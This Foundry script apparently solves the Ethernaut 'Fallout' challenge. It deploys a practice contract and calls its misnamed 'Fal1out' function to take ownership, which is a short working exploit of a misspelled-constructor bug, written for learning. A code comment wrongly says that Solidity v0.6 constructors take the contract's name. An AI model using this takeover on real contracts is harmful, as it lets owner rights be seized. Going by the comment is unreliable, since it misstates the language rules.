// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallout} from "../src/Fallout.sol";

contract FallbackSolution is Script {
    // $ forge script script/Fallout.s.sol

    function run() external {
        Fallout falloutInstance = new Fallout();

        // - The constuctor in solidity v6 should has the name of teh contract like java
        // - The issue here is that the contract name is `Fallout` and the constructor wrongly wrote as `Fal1out`
        // - since `Fal1out` is a normal function, anyone can be the owner of the contract by firing the function

        console.log("Owner:", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("New Owner:", falloutInstance.owner());
    }
}
